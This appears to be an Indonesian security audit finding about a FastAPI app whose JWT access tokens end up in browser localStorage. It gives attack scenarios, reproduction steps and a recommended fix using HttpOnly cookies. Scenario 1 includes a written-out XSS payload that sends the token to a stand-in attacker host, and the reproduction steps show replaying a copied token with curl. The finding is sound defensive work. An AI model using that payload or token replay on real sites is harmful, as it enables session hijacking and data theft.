# HIGH-003 — JWT Token Disimpan di localStorage Browser

![Severity](https://img.shields.io/badge/Severity-HIGH-red)
![Module](https://img.shields.io/badge/Module-Authentication%20%2F%20Frontend%20Integration-orange)
![Status](https://img.shields.io/badge/Status-Open-critical)

---

## Table of Contents

1. [Executive Summary](#executive-summary)
2. [Technical Analysis](#technical-analysis)
3. [Business Impact](#business-impact)
4. [Real Use Case Scenario](#real-use-case-scenario)
5. [Root Cause Analysis](#root-cause-analysis)
6. [Evidence / Code Reference](#evidence--code-reference)
7. [Reproduction / Testing Steps](#reproduction--testing-steps)
8. [Risk Assessment](#risk-assessment)
9. [Recommended Fix](#recommended-fix)
10. [Refactor Recommendation](#refactor-recommendation)
11. [Long-Term Improvement Recommendation](#long-term-improvement-recommendation)

---

## Executive Summary

Backend mengirimkan JWT token sebagai bagian dari **response body JSON** (`{"access_token": "eyJ..."}`). Token ini kemudian disimpan di **`localStorage` browser** oleh frontend. `localStorage` dapat diakses oleh **semua JavaScript yang berjalan di halaman** — termasuk script dari library pihak ketiga, browser extension, atau injeksi XSS.

Diperparah dengan tidak adanya token blacklist (HIGH-002), token yang berhasil dicuri memberikan akses penuh selama 24 jam tanpa kemungkinan direvoke.

---

## Technical Analysis

### Backend Mengirim Token di Response Body

```python
# app/api/v1/auth.py — callback()
return Token(
    access_token=internal_access_token,  # ← token ada di JSON response body
    token_type="bearer",
    expires_in=settings.jwt_access_token_expire_minutes * 60,
    user=LoggedInUser(...),
)
```

```python
# app/api/v1/auth.py — login_for_access_token()
return Token(
    access_token=access_token,  # ← sama, token di JSON body
    token_type="bearer",
    ...
)
```

**Token di response body** artinya frontend HARUS menyimpannya di JavaScript (memory, localStorage, sessionStorage) karena tidak ada cara lain untuk menggunakannya pada request berikutnya.

### Pola Tidak Aman yang Diakibatkan

```javascript
// Frontend code (pola yang terjadi saat token di response body)
const response = await fetch("/api/v1/auth/callback?code=...");
const data = await response.json();
localStorage.setItem("token", data.access_token); // ← dapat diakses JavaScript manapun

// Penggunaan di setiap request
const token = localStorage.getItem("token");
fetch("/api/v1/some-endpoint", {
  headers: { Authorization: `Bearer ${token}` },
});
```

**Perbandingan dengan pendekatan HttpOnly Cookie:**

```javascript
// Jika backend menggunakan Set-Cookie HttpOnly:
// 1. Frontend tidak perlu menyimpan token sama sekali
// 2. Cookie dikirim otomatis oleh browser
// 3. JavaScript TIDAK BISA membaca cookie HttpOnly
// 4. XSS tidak bisa mencuri token
```

---

## Business Impact

| Dampak                               | Deskripsi                                                                                     |
| ------------------------------------ | --------------------------------------------------------------------------------------------- |
| **Token theft via XSS**              | Satu celah XSS di halaman manapun cukup untuk mencuri semua token user aktif                  |
| **Token accessible via DevTools**    | Developer tools browser (F12 > Application > Local Storage) menampilkan token dalam plaintext |
| **Library pihak ketiga**             | NPM package yang digunakan frontend (analytics, tracking) bisa membaca localStorage           |
| **Browser extension**                | Extension browser dapat mengakses localStorage halaman                                        |
| **Akses tidak sah ke data sensitif** | Invoice, kontrak SCD, data finansial bisa diakses dengan token curian selama 24 jam           |

---

## Real Use Case Scenario

### Skenario 1: XSS Attack

```
1. Attacker menemukan celah XSS di halaman komentar/input teks di aplikasi frontend
2. Attacker memasukkan payload: <script>fetch('https://attacker.com/steal?t='+localStorage.getItem('token'))</script>
3. Setiap user yang membuka halaman tersebut, token-nya dikirim ke server attacker
4. Attacker menggunakan token untuk mengakses API backend
5. Data invoice, kontrak, financial records bocor
6. Backend tidak tahu bahwa token sedang digunakan attacker (tidak ada anomaly detection)
7. Token valid selama 24 jam — cukup untuk mengekstrak ribuan record
```

### Skenario 2: Insider Threat via DevTools

```
1. Karyawan IT support memiliki akses ke komputer kolega
2. Buka browser → F12 → Application → Local Storage
3. Salin nilai key "token" → dapat JWT plaintext
4. Gunakan token dari komputer/device lain
5. Akses data yang seharusnya tidak boleh dilihat
```

### Skenario 3: Third-Party Script

```
1. Frontend mengintegrasikan analytics tool (Google Analytics, Hotjar, dll)
2. Script analytics berjalan di domain yang sama
3. Script tersebut (atau versi yang sudah dikompromikan) dapat membaca localStorage
4. Token bocor ke third-party service tanpa disadari
```

---

## Root Cause Analysis

**Tipe masalah:** Insecure token storage pattern — token dikirim via response body, memaksa frontend menyimpannya di JavaScript-accessible storage

**Akar masalah:**

1. API dirancang untuk mengembalikan token di response body (standar OAuth2 Bearer) — cocok untuk server-to-server atau mobile native, **kurang tepat untuk web browser**
2. Tidak ada `Set-Cookie` dengan flag `HttpOnly` yang akan mencegah JavaScript mengakses token
3. Tidak ada pertimbangan tentang XSS risk dalam desain auth flow

---

## Evidence / Code Reference

| Item       | Detail                                                                                       |
| ---------- | -------------------------------------------------------------------------------------------- |
| **File**   | `app/api/v1/auth.py` — fungsi `callback()` dan `login_for_access_token()`                    |
| **Schema** | `Token` model — `access_token` field di response body                                        |
| **Flow**   | `/auth/callback` → `return Token(access_token=...)` → frontend dapat akses via JavaScript    |
| **Config** | `jwt_access_token_expire_minutes = 60 * 24` — 24 jam window of opportunity jika token dicuri |

---

## Reproduction / Testing Steps

### Demonstrasi Token di Browser

```
1. Buka aplikasi di browser
2. Login via SSO
3. Buka Developer Tools (F12)
4. Tab "Application" → "Local Storage" → pilih domain aplikasi
5. Cari key yang menyimpan token (biasanya "token", "access_token", atau "auth_token")
6. Token JWT terlihat sebagai plaintext — format: eyJ...

Expected (secure): Token tidak ada di localStorage
Actual (insecure): Token JWT terlihat jelas
```

### Simulasi Token Theft via Console

```javascript
// Buka browser console (F12 > Console) saat logged in
// Simulate apa yang XSS script bisa lakukan:
console.log(localStorage.getItem("token")); // atau nama key yang digunakan frontend
// Token JWT akan tampil di console

// Simulasi penggunaan token dari luar browser:
// Salin token, lalu di terminal:
// curl -X GET "http://localhost:8000/api/v1/activity-logs" \
//   -H "Authorization: Bearer <token_yang_dicopy>"
```

### Verifikasi Token Masih Valid Setelah "Dicuri"

```bash
# Setelah mendapatkan token dari localStorage:
TOKEN="eyJ..."

curl -X GET "http://localhost:8000/api/v1/activity-logs" \
  -H "Authorization: Bearer $TOKEN"
# Expected (secure): 401 jika token sudah di-revoke
# Actual (insecure): 200 OK dengan full data access
```

---

## Risk Assessment

| Aspek                         | Nilai                                                               |
| ----------------------------- | ------------------------------------------------------------------- |
| **Severity**                  | HIGH                                                                |
| **Urgency**                   | HIGH                                                                |
| **Likelihood**                | MEDIUM — bergantung pada keamanan frontend (ada/tidaknya XSS)       |
| **Impact if not fixed**       | Token theft melalui XSS atau DevTools memberikan akses penuh 24 jam |
| **Estimated Fix Complexity**  | HIGH — koordinasi backend + frontend diperlukan                     |
| **Estimated Production Risk** | HIGH — OWASP A07 violation                                          |

---

## Recommended Fix

### Pendekatan: HttpOnly Cookie

**Ubah `/auth/callback` untuk mengirim token via cookie, bukan response body:**

```python
# app/api/v1/auth.py
from fastapi.responses import JSONResponse

@router.get("/callback")
async def callback(...):
    # ... validasi dan buat token seperti sekarang ...

    # Buat response dengan token di cookie, bukan di body
    response = JSONResponse(
        content={
            "user": LoggedInUser(
                id=user.id,
                email=user.email,
                full_name=user.full_name,
                roles=roles,
                permissions=permissions,
                custodian_division_ids=custodian_division_ids,
            ).model_dump()
            # ← TIDAK ada "access_token" di body
        }
    )

    response.set_cookie(
        key="access_token",
        value=f"Bearer {internal_access_token}",
        httponly=True,     # ← JavaScript tidak bisa baca
        secure=True,       # ← Hanya dikirim via HTTPS
        samesite="strict", # ← Melindungi dari CSRF
        max_age=settings.jwt_access_token_expire_minutes * 60,
        path="/api",       # ← Hanya untuk path API
    )

    return response
```

**Update `oauth2_scheme` untuk membaca dari cookie:**

```python
# app/core/security.py
from fastapi import Cookie

async def get_current_user(
    request: Request,
    token_from_header: Optional[str] = Depends(oauth2_scheme),
    access_token_cookie: Optional[str] = Cookie(default=None, alias="access_token"),
):
    # Prioritaskan header (untuk API client), fallback ke cookie (untuk browser)
    token = token_from_header
    if not token and access_token_cookie:
        token = access_token_cookie.replace("Bearer ", "")

    user = await get_current_user_from_jwt(token)
    ...
```

### CORS Update yang Diperlukan

```python
# app/core/config.py — dan app/main.py
# CORS harus mengizinkan credentials untuk cookie bekerja
cors_allow_credentials: bool = True

# app/main.py
app.add_middleware(
    CORSMiddleware,
    allow_origins=["https://frontend.kpc.co.id"],  # HARUS spesifik, bukan "*"
    allow_credentials=True,  # Diperlukan untuk cookie
    allow_methods=["*"],
    allow_headers=["*"],
)
```

---

## Refactor Recommendation

1. Pisahkan auth response menjadi dua: `UserInfoResponse` (di body, aman) dan `TokenCookieResponse` (di cookie, tidak tampil di body)
2. Tambahkan `CSRF token` sebagai double-submit cookie pattern untuk proteksi CSRF
3. Pertimbangkan `__Host-` prefix pada cookie untuk keamanan lebih: `__Host-access_token`

---

## Long-Term Improvement Recommendation

1. **Content Security Policy (CSP)** — Tambahkan CSP header untuk membatasi script yang bisa berjalan, mengurangi XSS risk
2. **Subresource Integrity (SRI)** — Verifikasi integritas third-party scripts
3. **Security audit frontend** — Lakukan audit XSS di semua input fields frontend
4. **Penetration testing** — Test XSS scenarios secara regular
5. **Web Application Firewall (WAF)** — Deploy WAF untuk mendeteksi dan memblokir XSS attempts

---

_Related Finding: HIGH-002 (No Token Blacklist), HIGH-006 (CORS Wildcard)_
_Related API: `GET /api/v1/auth/callback`, `POST /api/v1/auth/token`_
_Related Table: N/A_
